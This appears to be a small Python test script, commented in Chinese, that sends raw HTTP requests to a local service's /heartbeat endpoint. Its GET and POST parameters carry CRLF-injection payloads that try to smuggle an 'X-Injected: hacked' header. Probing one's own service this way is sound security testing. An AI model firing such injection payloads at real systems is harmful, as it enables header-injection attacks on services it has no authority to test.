import socket

# 直接发送原始 HTTP 请求来测试 CRLF 注入

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 5000

# 测试 1: 尝试在 header 中注入 CRLF
raw_request = (
    "GET /heartbeat?text=test&client=X-Test%0d%0aX-Injected:%20hacked&token=value HTTP/1.1\r\n"
    "Host: 127.0.0.1:5000\r\n"
    "Connection: close\r\n"
    "\r\n"
)

print("=== Test 1: URL encoded CRLF in client parameter ===")
print(f"Request:\n{raw_request}")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_HOST, TARGET_PORT))
    sock.sendall(raw_request.encode())
    response = sock.recv(4096)
    sock.close()
    print(f"Response:\n{response.decode('utf-8', errors='replace')}")
except Exception as e:
    print(f"Error: {e}")

# 测试 2: 直接在请求体中包含 CRLF (POST)
print("\n\n=== Test 2: Direct CRLF in POST parameter ===")
body = "text=test&client=X-Test\r\nX-Injected: hacked&token=value"
raw_request2 = (
    f"POST /heartbeat HTTP/1.1\r\n"
    f"Host: 127.0.0.1:5000\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body)}\r\n"
    f"Connection: close\r\n"
    f"\r\n"
    f"{body}"
)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_HOST, TARGET_PORT))
    sock.sendall(raw_request2.encode())
    response = sock.recv(4096)
    sock.close()
    print(f"Response:\n{response.decode('utf-8', errors='replace')}")
except Exception as e:
    print(f"Error: {e}")
